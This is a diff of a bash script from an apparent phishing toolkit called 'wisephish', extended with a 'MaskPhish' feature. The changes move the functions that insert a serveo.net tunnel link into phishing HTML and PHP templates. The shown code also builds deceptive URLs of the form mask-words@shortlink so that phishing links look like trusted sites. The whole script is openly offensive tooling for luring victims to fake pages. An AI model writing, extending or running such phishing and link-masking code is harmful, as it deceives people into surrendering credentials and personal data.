@@ -8,8 +8,9 @@ banner() {
 
 clear
 
-printf "\e[1;77m Version 1.0 Official (01/2021) \e[0m \n"
+printf "\e[1;77m Beta Version 1.1 Official (02/2021) \e[0m \n"
 printf "\e[1;77m Coded By MJK11958 \e[0m \n"
+printf "\e[1;77m MaskPhish By jaykali \e[0m \n"
 
 }
 
@@ -190,43 +191,7 @@ start1
 fi
 
 }
-
-
-payload() {
-
-send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
-
-sed 's+forwarding_link+'$send_link'+g' wisephish.html > index2.html
-sed 's+forwarding_link+'$send_link'+g' template.php > index.php
-
-
-}
-
-start() {
-
-default_choose_sub="Y"
-default_subdomain="wisephish$RANDOM"
-
-printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Choose subdomain? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
-read choose_sub
-choose_sub="${choose_sub:-${default_choose_sub}}"
-if [[ $choose_sub == "Y" || $choose_sub == "y" || $choose_sub == "Yes" || $choose_sub == "yes" ]]; then
-subdomain_resp=true
-printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Subdomain: (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_subdomain
-read subdomain
-subdomain="${subdomain:-${default_subdomain}}"
-fi
-
-server
-payload
-checkfound
-
-}
-
-banner
-dependencies
-start1
-
+mask_phish
 # Bash Script for Hide Phishing URL Created by KP
 if [[ $option_server -eq 1 ]]; then
 url_checker() {
@@ -268,3 +233,40 @@ read words
 echo -e "\nGenerating MaskPhish Link...\n"
 final=$mask-$words@$shorter
 echo -e "Here is the MaskPhish URL:\e[32m ${final} \e[0m\n"
+}
+
+
+payload() {
+
+send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
+
+sed 's+forwarding_link+'$send_link'+g' wisephish.html > index2.html
+sed 's+forwarding_link+'$send_link'+g' template.php > index.php
+
+
+}
+
+start() {
+
+default_choose_sub="Y"
+default_subdomain="wisephish$RANDOM"
+
+printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Choose subdomain? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
+read choose_sub
+choose_sub="${choose_sub:-${default_choose_sub}}"
+if [[ $choose_sub == "Y" || $choose_sub == "y" || $choose_sub == "Yes" || $choose_sub == "yes" ]]; then
+subdomain_resp=true
+printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Subdomain: (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_subdomain
+read subdomain
+subdomain="${subdomain:-${default_subdomain}}"
+fi
+
+server
+payload
+checkfound
+
+}
+
+banner
+dependencies
+start1
